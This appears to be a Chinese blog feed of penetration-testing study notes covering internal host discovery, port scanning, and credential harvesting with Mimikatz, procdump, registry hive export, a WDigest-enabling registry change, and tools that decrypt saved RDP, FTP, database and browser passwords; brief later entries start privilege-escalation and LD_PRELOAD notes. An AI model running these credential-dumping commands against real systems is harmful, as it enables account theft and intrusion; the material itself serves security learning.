OSI&#x2F;RM的会话层(在TCP&#x2F;IP模型中包含在应用层中)服务，让不同计算机上运行的不同程序可以在局域网中互相连接和共享数据。</p><p>NetBIOS 的工作流程就是正常的机器名解析、查询、应答的过程。在 Windows 中，默认安装 TCP&#x2F;IP 后会自动安装 NetBIOS。</p><p>在实际利用时，向局域网的每个IP地址发送NetBIOS状态查询，可以获得主机名MAC 地址等信息。</p><blockquote><p>NBTScan 是一款用于扫描 Windows 网络上NetBIOS 名称的程序,用于发现内网中存活的 Windows 主机。NBTScan 可以对给定IP范围内的每个IP地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，会列出它的IP地址NetBIOS计算机名、登录用户名和MAC地址。工具地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p></blockquote><p>将工具上传到主机之后执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nbtscan 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324212209943.png" alt="image-20240324212209943"></p><p><strong>基于UDP发现存活主机</strong></p><p>在实际利用中，可以将一个空的UDP报文发送到目标主机的特定端口，如果目标主机的端口是关闭的，UDP探测就马上得到一个ICMP端口无法到达的回应报文，这意味着该主机正在运行。如果到达一个开放的端口，大部分服务仅仅忽略这个空报文而不做任何回应。</p><p>Unicornscan 是Kali Linux平台的一款信息收集工具，提供了网络扫描功能。执行以下命令，通过 UDP协议扫描内网的存活主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">unicornscan -mU 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324212621176.png" alt="image-20240324212621176"></p><p><strong>基于ARP发现存活主机</strong></p><p>在实际利用中，可以向网络发送一个ARP请求，若目标主机处于活跃状态，则其一定会回应一个 ARP 响应，否则不会做出任何回应。</p><ul><li>利用ARP-Scan</li></ul><p>ARP-Scan 是一款快速、便捷的内网扫描工具，利用 ARP 发现内网中存活的主机。将工具上传到目标主机，执行以下命令，即可扫描内网中存活的主机。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">arp-scan -t 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324213635193.png" alt="image-20240324213635193"></p><ul><li>利用powershell</li></ul><p>Empire 渗透框架的 Invoke-ARPScan.psl脚本可利用 ARP发现内网存活主机，工具地址：<a href="https://github.com/EmpireProject/Empire%E3%80%82(%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%E7%94%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%B2%A1%E6%89%BE%E5%88%B0powershell%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%A5%BD%E5%83%8F%E6%98%AF%E5%B7%B2%E7%BB%8F%E5%8F%96%E6%B6%88%E4%BA%86%EF%BC%8C%E6%8A%8A%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%BE%E8%BF%99)%E4%BD%BF%E7%94%A8%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%B0%86%E8%84%9A%E6%9C%AC%E5%AF%BC%E5%85%A5%E6%89%A7%E8%A1%8C">https://github.com/EmpireProject/Empire。(暂时不会用，因为没找到powershell脚本，好像是已经取消了，把使用命令放这)使用时，需要将脚本导入执行</a>:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-ARPScan.ps1<br>Invoke-ARPScan -CIDR 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><strong>基于 SMB(Server Message Block，服务器消息块)协议发现存活主机</strong></p><p>SMB 又称为网络文件共享系统(CommonInternetFileSystem，CIFS)协议，是一种应用层传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通信等资源。CIFS 消息一般使用 NetBIOS 或 TCP 发送，分别使用139或 445 端口目前倾向于使用 445 端口。</p><p>在实际利用中，可以探测局域网中存在的SMB 服务，从而发现内网的存活主机，多适用于 Windows 主机的发现。</p><p>CrackMapExec(简称CME)是一款十分强大的后渗透利用工具，在KaliLinux上可以直接使用 apt-get命令进行安装。CrackMapExec能够枚举登录用户、枚举SMB服务列表、执行 WINRM 攻击等功能，可以帮助测试人员自动化评估大型域网络的安全性.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.30.1/24<br></code></pre></td></tr></table></figure><p>我的kali不在同一个网络检测不了，检测出来的效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324215607566.png" alt="image-20240324215607566"></p><h2 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h2><p>端口扫描就是用于探测主机开启了哪些服务，从而查找相应的漏洞进行攻击</p><p><strong>利用Telnet探测端口</strong></p><p>Telnet 是进行远程登录的标准协议和主要方式,为用户提供了在本地计算机上完成远程主机工作的能力。telnet命令可以简单测试指定的端口号是正常打开还是关闭状态。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324221045451.png" alt="image-20240324221045451"></p><p><strong>利用nmap进行端口扫描</strong></p><p>Nmap 是一个十分强大的端口扫描工具,在实际利用中可以借助内网代理对内网主机进行端口扫描。nmap的使用需要好好去学习，到时查查资料学习。</p><p>下面是一些常用的扫描命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -p 80,88,135,139,443,8080,3306,3389 172.25.87.14 #扫描目标主机的指定端口<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324221409497.png" alt="image-20240324221409497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">namp -sS -p 1-65535 172.25.87.14 #扫描目标主机的全部端口<br><br>nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11 #扫描并获取目标主机指定端口上开放的服务版本<br></code></pre></td></tr></table></figure><p><strong>利用PowerShell进行端口扫描</strong></p><p>NiShang 是基于PowerShell 的渗透测试专用框架，集成了各种脚本和Payload，广泛用于渗透测试的各阶段。<br>NiShang 的 Scan 模块中也有一个 Invoke-PortsCan.ps1 脚本，可以用来对主机进行端口扫描，工具地址：<a href="https://github.com/samratashok/nishang%E3%80%82">https://github.com/samratashok/nishang。</a></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324222008156.png" alt="image-20240324222008156"></p><p>执行下面命令对内网的一个主机范围执行默认的端口扫描，这里要先用管理员权限修改成可以执行脚本策略，然后导入模块再使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-PortScan.ps1<br>Invoke-PortScan -StartAddress 192.168.30.10 -EndAddress 192.168.30.20 -ResolveHost -ScanPort<br><span class="hljs-meta prompt_">#</span><span class="language-bash">还可以在后面再加上一个-Port选项指定扫描端口</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324223527832.png" alt="image-20240324223527832"></p><p><strong>利用MetaSploit探测内网</strong></p><p>MetaSploit 渗透框架中内置了几款资源收集模块，可用于发现内网存活主机、探测内网服务、对目标主机进行端口扫描，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324223901678.png" alt="image-20240324223901678"></p><p><strong>获取端口Banner信息</strong></p><p>Banner 中可能包含一些敏感信息。通过查看端口的Banner，测试人员往往可以获取软件开发商、软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用。</p><ul><li><p>利用NetCat获取端口Banner</p><p>Netcat 是一款常用的测试工具和黑客工具，使用 NetCat 可以轻易建立任何连接，具有“瑞士军刀”的美誉。</p><p>通过-nv选项可以在连接端口时获取该端口的Banner信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -nv &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324225257083.png" alt="image-20240324225257083"></p></li><li><p>利用Telnet获取端口Banner</p><p>如果目标端口开放，使用Telnet连接后，也会返回相应的Banner信息.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure></li><li><p>利用Nmap获取端口Banner</p><p>在Nmap中指定脚本**–script&#x3D;banner**就可以在扫描中获取端口的banner信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap --script=banner -p &lt;Ports&gt; &lt;IP&gt;<br></code></pre></td></tr></table></figure></li></ul><h1 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h1><p>在内网渗透中，当测试人员获取某台机器的控制权后，会以被攻陷的主机为跳板进行横向渗透，进一步扩大所掌控的资源范围。但是横向渗透中的很多攻击方法都需要先获取到域内用户的密码或哈希值才能进行，如哈希传递攻击、票据传递攻击等。所以在进行信息收集时，要尽可能收集域内用户的登录凭据等信息</p><h2 id="获取域内单机密码和哈希值"><a href="#获取域内单机密码和哈希值" class="headerlink" title="获取域内单机密码和哈希值"></a>获取域内单机密码和哈希值</h2><blockquote><p>在 Windows中,SAM文件是 Windows用户的账户数据库,位于系统的%SystemRoot%System32\Config 目录中，所有本地用户的用户名、密码哈希值等信息都存储在这个文件中。用户输入密码登录时，用户输入的明文密码被转换为哈希值，然后与SAM文件中的哈希值对比，若相同，则认证成功。</p><p>lsass.exe是Windows的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。在通常情况下，用户输入密码登录后，登录的域名、用户名和登录凭据等信息会存储在lsass.exe的进程空间中，用户的明文密码经过 WDigest和 Tspkg模块调用后,会对其使用可逆的算法进行加密并存储在内存中。</p><p>用来获取主机的用户密码和哈希值的工具有很多,这些工具大多是通过读取 SAM 文件或者访问 lsass.exe 进程的内存数据等操作实现的。这些操作大多需要管理员权限，这意味着需要配合一些提权操作。</p></blockquote><p>下面利用Mimikatz工具来进行学习，Mimikatz是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限、注入进程、读取进程内存等，广泛用于内网渗透测试领域</p><p><strong>在线读取lsass进程内存</strong></p><p>将mimikatz上传到主机执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；sekurlsa::logonpasswords用于导出用户凭据</span><br></code></pre></td></tr></table></figure><p>可直接从lsass.exe进程的内存中读取当前已登录用户的凭据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324232522666.png" alt="image-20240324232522666"></p><p>不过我这里失败了不知道为什么，成功的话应该是下面这样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324233242439.png" alt="image-20240324233242439"></p><p>后来试了一下需要管理员权限，那应该是提权之后的事情了这一步</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324233522901.png" alt="image-20240324233522901"></p><p><strong>离线读取lsass内存文件</strong></p><p>除了在线读取，也可以直接将Isass.exe的进程内存转储，将内存文件导出到本地后使用 Mimikatz 进行离线读取。用于转储进程内存的工具有很多，如 OutMinidump.ps1、Procdump、SharpDump等，甚至可以手动加载系统自带的comsvcs.dll 来实现内存转储。</p><p>这里用微软官方提供的Procdump工具，首先要在主机上传该程序，然后执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">procdump.exe -accepteula -ma lsass.exe lsass.dmp #将lsass.exe的进程转储<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324234127358.png" alt="image-20240324234127358"></p><p>然后再执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">sekurlsa::minidump lsass.dmp用于加载内存文件；sekurlsa::logonpasswords用于导出用户凭据； full 参数表示要输出全部可用的明文凭据信息，包括密码等详细信息；<span class="hljs-built_in">exit</span> 参数表示退出 Mimikatz 工具，结束当前会话。</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240324234639154.png" alt="image-20240324234639154"></p><blockquote><p>注意,为了防止用户的明文密码在内存中泄露,微软在2014年5月发布了KB2871997补丁，关闭了 WDigest 功能，禁止从内存中获取明文密码，且 Windows Server 2012 及以上版本默认关闭 WDigest 功能。但是测试人员通过修改注册表，可以重新开启 WDigest功能，当用户注销或者重新登录后，就可以重新获取到用户的明文密码。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><p><strong>在线读取SAM文件</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br><span class="hljs-meta prompt_">#</span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；token::elevate用于提升至SYSTEM权限；用于读取本地的SAM文件</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325001115648.png" alt="image-20240325001115648"></p><p>读取 SAM 文件中保存的用户登录凭据，可以导出当前系统中所有本<br>地用户的哈希值。</p><p><strong>离线读取SAM文件</strong></p><p>离线读取就是将SAM文件导出，再用mimikatz来读取。不过为了提高 SAM 文件的安全性以防止离线破解，Windows 会对 SAM 文件使用密钥进行加密，这个密钥存储在 SYSTEM 文件中，与 SAM 文件位于相同目录下。</p><p>因为系统在运行时，这两个文件是被锁定的，所以需要借助一些工具来实现，而PowerSploit 项目中提供的Invoke-NinjaCopy.ps1脚本可以完成这项工作</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SAM<br><br>Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SYSTEM<br></code></pre></td></tr></table></figure><blockquote><p>此外如果能够提权，测试人员可以直接读取SAM和SYSTEM</p></blockquote><p>还可以在管理员权限下通过保存注册表的方式导出</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg save HKLM\SAM sam.hive<br>reg save HKLM\SYSTEM system.hive<br></code></pre></td></tr></table></figure><p>然后将导出的两个文件使用mimikatz加载并读取sam中的用户凭据信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit<br></code></pre></td></tr></table></figure><h2 id="获取常见应用软件凭据"><a href="#获取常见应用软件凭据" class="headerlink" title="获取常见应用软件凭据"></a>获取常见应用软件凭据</h2><p>为了扩大可访问的范围，测试人员通常会搜索各种常见的密码存储位置，以获取用户凭据。一些特定的应用程序可以存储密码，以方便用户管理和维护，如Xmanager、TeamViewer、FileZilla、NaviCat和各种浏览器等。通过对保存的用户凭据进行导出和解密，测试人员通常可以获取登录内网服务器和各种管理后台的账号密码，可以通过它们进行横向移动和访问受限资源。</p><p><strong>获取RDP保存的凭据</strong></p><p>为了避免每次连接服务器都进行身份验证，经常使用RDP远程桌面连接远程服务器的用户可能勾选保存连接凭据，以便进行快速的身份验证。这些凭据都使用数据保护API以加密形式存储在 Windows 的凭据管理器中，路径为%USERPROFILE%\AppData\LocalMicrosoft\Credentials </p><blockquote><p>%USERPROFILE%即为C:\Users&lt;用户名&gt;</p></blockquote><p>下面命令可以查看当前主机上保存的所有连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cmdkey /list #查看当前保存的凭据<br>dir /a %USERPROFILE%\AppData\LocalMicrosoft\Credentials\* #遍历Credentials下保存的所有凭据<br></code></pre></td></tr></table></figure><p>我这里没有凭据所以就借助书中的图来记录，我们可以看到两个历史凭据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003242224.png" alt="image-20240325003242224"></p><p>然后用mimikatz来导出指定RDP连接凭据，执行下面命令解析连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003535797.png" alt="image-20240325003535797"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003553911.png" alt="image-20240325003553911"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003606845.png" alt="image-20240325003606845"></p><p>上图中得到的 pbData就是凭据的加密数据，guidMasterKey 是该凭据的 GUID，记录 guidMasterKey 的值。然后执行以下命令:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa:dpapi&quot; exit<br></code></pre></td></tr></table></figure><p>找到与 guidMasterKey(GUID)相关联的MasterKey，这个MasterKey就是加密凭据所使用的密钥。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325003915323.png" alt="image-20240325003915323"></p><p>记录结果中的MasterKey值，最后执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C/masterkey:&lt;刚刚记录的masterkey的值&gt;&quot; exit<br></code></pre></td></tr></table></figure><p>最后成功解密得到RDP明文凭据</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004214310.png" alt="image-20240325004214310"></p><p><strong>获取Xshell保存的凭据</strong></p><p>Xshell 会将服务器连接信息保存在Session目录下的.xsh 文件中，路径如表 如下图。如果用户在连接时勾选了“记住用户名&#x2F;密码”，该文件会保存远程服务器连接的用户名和经过加密后的密码。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004349401.png" alt="image-20240325004349401"></p><p>Xshell 7 前的版本，测试人员可以直接通过 SharpDecryptPwd 工具进行解密，包括Navicat、TeamViewer、FileZilla、WinSCP和Xmangager 系列产品，工具地址：<a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p><p>将工具上传到主机，执行下面命令可以直接获取Xshell保存的所有连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang Computer 6\Xshell\Sessions&quot;<br></code></pre></td></tr></table></figure><p>Xshell 7后的版本，Session目录中不再存储用户密码，用上述方法获取的密码为一串乱码，只能使用星号密码查看器直接查看密码.</p><p><strong>获取FileZilla保存的凭据</strong></p><p>FileZilla 是一款快速的、可依赖的、开源的 FTP 客户端软件，具备大多数 FTP 软件功能。FileZila会将所有FTP登录凭据以Base64密文的格式保存在%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml文件中,如图所示。</p><p>由图可知<User>节点记录了 FTP 登录用户,<Pass>节点记录了 Base64 加密后的用户密码，将加密的FTP密码解码即可。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325004912460.png" alt="image-20240325004912460"></p><p>使用SharpDecryptPwd执行下面命令可以一键导出FileZilla保存的FTP登录凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -FileZilla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005038300.png" alt="image-20240325005038300"></p><p><strong>获取NaviCat保存的凭据</strong></p><p>用户连接数据库时，需要填写相关信息，如IP、用户名、密码等。用户选择保存密码(默认勾选)后，Navicat将把这些信息保存到注册表中，具体路径如下表</p><table><thead><tr><th>数据库类型</th><th>凭据存储路径(注册表)</th></tr></thead><tbody><tr><td>Mysql</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQL SERVER</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt; Connetion Name&gt;</td></tr></tbody></table><p>数据库的连接记录中的Pwd键的值为经过Navicat&lt;&#x3D;11版本算法加密过后的密码，可以在网上搜索解密脚本解出。</p><p>也可以直接使用 Navicat 导出所有连接，将生成connections.ncx 文件，保存所有连接记录。其中，“Password”对应的值即使用 Navicat&gt;&#x3D;12 版本算法加密过后的密码，再对其进行解密。</p><p>下面命令可以一键导出当前主机上用户连接过的所有数据库的登录凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -NavicatCrypto<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325010347363.png" alt="image-20240325010347363"></p><p><strong>获取浏览器保存的登陆凭据</strong></p><p>Web 浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。通常，用户的凭据以加密格式存储在本地文件中，测试人员可以通过读取特定的文件，从Web 浏览器中获取凭据。</p><p>HackBrowserData 是一款开源工具，可以直接从浏览器解密数据包括用户登录密码书签、Cookie、历史记录、信用卡、下载链接等，支持流行的浏览器，可在 Windows、macOS 和 Linux平台上运行，工具地址：<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p>只需将 HackBrowserData 上传到目标主机，然后直接运行即可，执行完毕后，会在当前目录下生成一个 result 目录，包含当前主机中已安装的所有浏览器保存的用户登录密码、浏览器书签、Cookie、历史记录等信息的 CSV 文件。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005731788.png" alt="image-20240325005731788"></p><p>用excel打开就可以看到解密出来的所有登陆凭据</p><p><strong>获取WinSCP保留的登陆凭据</strong></p><p>WinSCP是Windows环境下使用SSH的开源图形化SFTP 工具客户端。在使用SFTP连接时，如果勾选了“保存密码”，WinSCP就会将密码保存在WinSCP.ini文件下。Winscppwd工具则可以进行解密。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325005905488.png" alt="image-20240325005905488"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升技术-1</title>
      <link href="/2024/03/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF-1/"/>
      <url>/2024/03/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF-1/</url>
      
        <content type="html"><![CDATA[<p><strong>该系列笔记是跟着权限提升这本书来学习的</strong></p><h1 id="Windows基础知识"><a href="#Windows基础知识" class="headerlink" title="Windows基础知识"></a>Windows基础知识</h1><h2 id="用户和用户组"><a href="#用户和用户组" class="headerlink" title="用户和用户组"></a>用户和用户组</h2><h3 id="本地用户组"><a href="#本地用户组" class="headerlink" title="本地用户组"></a>本地用户组</h3>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub的disable_function</title>
      <link href="/2024/03/11/ctfhub%E7%9A%84disable-function/"/>
      <url>/2024/03/11/ctfhub%E7%9A%84disable-function/</url>
      
        <content type="html"><![CDATA[<p><strong>这是ctfhub的Bypass disable_function知识体系</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240311235539559.png" alt="image-20240311235539559"></p><p>好多新东西能学的，来研究一下。</p><h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p><strong>这里首先来了解一下动态链接库(也叫共享库)，这部分在深入理解计算机系统这本书有详细说明，这里简单了解一下</strong></p><p><strong>共享库</strong>（shared library）是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序链接起来。这个过程称为<strong>动态链接</strong>（dynamic linking），是由一个叫做<strong>动态链接器</strong>（dynamic linker）的程序来执行的。共享库也称为<strong>共享目标</strong>（shared object），在 Linux 系统中通常用 .so 后缀来表示。微软的操作系统大量地使用了共享库，它们称为 DLL（动态链接库）。</p><p>程序编译的四个过程如图(预处理、编译、汇编、链接)：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312001644436.png" alt="image-20240312001644436"></p><p>一个示例程序的动态链接的过程如图：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vector.h&quot;</span></span><br><br><span class="hljs-type">int</span> x[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> y[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">int</span> z[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    addvec(x, y, z, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;z = [%d %d]\n&quot;</span>, z[<span class="hljs-number">0</span>], z[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312001800286.png" alt="image-20240312001800286"></p><p>这里介绍一个<strong>ldd命令</strong>，该命令的作用是：打印程序或者库文件所依赖的共享库列表</p><p>这是一个示例程序：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;string&gt; msg &#123;<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-string">&quot;C++&quot;</span>, <span class="hljs-string">&quot;World&quot;</span>, <span class="hljs-string">&quot;from&quot;</span>, <span class="hljs-string">&quot;VS Code&quot;</span>, <span class="hljs-string">&quot;and the C++ extension!&quot;</span>&#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> string&amp; word : msg)<br>    &#123;<br>        cout &lt;&lt; word &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们用ldd去看下编译生成的程序所依赖的库</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312002417051.png" alt="image-20240312002417051"></p><p><strong>知道上面的基础东西之后，就来看一下LD_PRELOAD</strong></p><blockquote><p> 